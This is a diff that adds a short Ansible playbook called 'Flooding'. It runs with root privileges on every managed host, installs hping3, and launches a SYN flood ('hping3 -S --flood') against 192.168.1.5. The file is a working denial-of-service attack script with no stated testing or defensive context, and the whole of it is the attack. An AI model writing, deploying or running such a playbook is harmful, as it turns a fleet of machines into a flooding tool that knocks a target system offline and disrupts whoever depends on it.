@@ -1,0 +1,10 @@
+- name: Flooding
+  hosts: all
+  become: yes
+  tasks:
+    - name: Install hping3
+      apt:
+        name: hping3
+        state: present
+    - name: DoS flood
+      command: hping3 -S --flood -V 192.168.1.5
